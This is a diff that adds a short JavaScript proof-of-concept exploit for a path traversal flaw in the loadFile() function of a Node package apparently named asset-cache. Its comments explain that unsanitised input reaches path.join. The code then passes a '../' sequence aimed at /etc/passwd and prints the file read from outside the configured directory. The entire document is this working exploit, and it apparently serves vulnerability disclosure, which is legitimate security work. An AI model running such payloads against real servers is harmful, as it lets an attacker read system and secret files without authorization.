@@ -1,0 +1,24 @@
+```javascript
+// Exploit: Path Traversal in asset-cache's loadFile()
+// The `file` parameter is passed directly to path.join(config.dir, file)
+// without any sanitization, allowing "../" sequences to escape config.dir
+// and read arbitrary files on the filesystem.
+
+const assetServer = require("asset-cache");
+
+// Point the "cache root" at some seemingly safe directory
+assetServer.setCwd(__dirname + "/public");
+
+// Attacker-controlled input containing path traversal sequences,
+// e.g. as would arrive via req.url in handleRequest()
+const maliciousPath = "/../../../../../../../../etc/passwd";
+
+assetServer.loadFile(maliciousPath, null, function (err, data) {
+  if (err) {
+    console.error("Error:", err.message);
+    return;
+  }
+  console.log("Successfully read file outside of configured directory:");
+  console.log(data.toString());
+});
+```
